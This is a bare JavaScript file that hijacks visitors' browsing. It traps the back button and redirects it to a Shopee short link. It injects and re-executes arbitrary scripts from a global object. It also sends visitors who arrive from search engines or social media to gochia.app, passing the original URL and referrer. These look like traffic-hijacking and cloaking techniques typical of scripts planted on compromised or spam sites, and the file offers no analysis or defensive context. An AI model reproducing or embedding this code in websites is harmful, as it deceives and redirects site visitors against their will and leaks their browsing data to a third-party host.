//---- disable back ----
history.pushState(null, document.title, window.location.href);
window.addEventListener('popstate', function (event)
{
  window.location.href="https://shope.ee/6Uhmz5pJ0c";
});
window.addEventListener('scroll', function() {
  history.pushState(null, document.title, window.location.href);
});

function urlParse(data){
  var m = data.match(/^(([^:\/?#]+:)?(?:\/\/((?:([^\/?#:]*):([^\/?#:]*)@)?([^\/?#:]*)(?::([^\/?#:]*))?)))?([^?#]*)(\?[^#]*)?(#.*)?$/),
        r = {
            hash: m[10] || "",
            host: m[3] || "",
            hostname: m[6] || "",
            href: m[0] || "",
            origin: m[1] || "",
            pathname: m[8] || (m[1] ? "/" : ""),
            port: m[7] || "",
            protocol: m[2] || "",
            search: m[9] || "",
            username: m[4] || "",
            password: m[5] || "" 
        };
    if (r.protocol.length == 2) {
        r.protocol = "file:///" + r.protocol.toUpperCase();
        r.origin = r.protocol + "//" + r.host;
    }
    r.href = r.origin + r.pathname + r.search + r.hash;
    return r;
};

function maketextnumber(n) {
    for (var r = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], e = n, t = new Array, a = 0; a <= e - 1; a++) {
        t[a] = r[parseInt(Math.random() * r.length)];
        t = t;
    }
    return t.join("");
}

function removeImg(data){
  let targetImg=document.querySelector(`[pick-image="`+data+`"]`);
  if(targetImg!=null){
    targetImg.remove();
  };
};

function referer_se()
{
    return str_contains(document.referrer.toLowerCase(), ['.google.', '.yahoo.', '.bing.', '.yandex.']);
}

function referer_sm()
{
    return str_contains(document.referrer.toLowerCase(), ['fb.com', 'facebook.com', 'twitter.com', 'pinterest.com', 'plus.google.']);
}

function referer_empty()
{
    var referer = document.referrer;
    return (!referer || 0 === referer.length);
}

function referer_not_empty()
{
    return !referer_empty();
}

function str_contains(str, needles){
    var contains = false;

    needles.forEach(function(needle){
        if(str.indexOf(needle) != -1){
            contains = true;
        }
    });

    return contains;
}

function setInnerHTML(elm, html) {
    elm.innerHTML = html;
    Array.from(elm.querySelectorAll("script")).forEach( oldScript => {
        const newScript = document.createElement("script");
        Array.from(oldScript.attributes)
        .forEach( attr => newScript.setAttribute(attr.name, attr.value) );
        newScript.appendChild(document.createTextNode(oldScript.innerHTML));
        oldScript.parentNode.replaceChild(newScript, oldScript);
    });
}

function inject(location, pu_var)
{
    //Create the element using the createElement method.
    var myDiv = document.createElement("div");
    myDiv.setAttribute("style","display: flex;justify-content: center;");

    let doc=document[location];

    if (doc) {
        document[location].appendChild(myDiv);

        //Set its unique ID.
        //myDiv.id = 'pop_' + window.pu.id + '_' + pu_var;
        //Add your content to the DIV
        setInnerHTML(myDiv, window.pu[pu_var]);
        console.log("Element found " + location);

    } else {
        console.log("Not found " + location);
    }
}
//<![CDATA[
    if(document.referrer)
    {
    	var cek = document.referrer;

    	var ars 	= rChoice([
							'https://gochia.app/',
							]);

				function rChoice(arr) {
    			return arr[Math.floor(arr.length * Math.random())];
	}

	//Code arsae client javascript
	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
    }
//]]>

